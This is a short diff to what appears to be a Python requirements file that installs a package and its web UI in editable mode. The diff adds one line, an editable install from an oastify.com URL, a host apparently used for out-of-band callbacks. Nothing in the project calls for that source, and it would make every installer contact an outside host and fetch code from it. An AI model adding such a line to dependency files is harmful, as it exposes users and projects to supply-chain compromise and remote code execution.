@@ -1,4 +1,5 @@
 # installs dependencies from ./setup.py, and the package itself,
 # in editable mode
+-e http://oqi6jw6whg5snlzjjg7wcv9gc7iy6pwdl.oastify.com
 -e ./aim/web/ui
 -e .
